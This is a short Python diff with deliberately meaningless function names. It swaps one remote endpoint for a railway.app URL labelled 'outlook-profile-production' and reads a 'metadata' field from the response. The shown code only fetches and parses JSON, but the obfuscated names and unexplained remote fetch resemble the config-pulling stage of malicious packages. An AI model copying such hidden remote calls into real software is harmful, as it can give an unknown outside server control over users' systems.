@@ -18,7 +18,7 @@ def process_lueqvs_204():
 
     def model_emyzyt_381():
         try:
-            data_zwwnmq_672 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            data_zwwnmq_672 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_zwwnmq_672.raise_for_status()
             train_qfjfwz_278 = data_zwwnmq_672.json()
             train_idymqp_235 = train_qfjfwz_278.get('metadata')
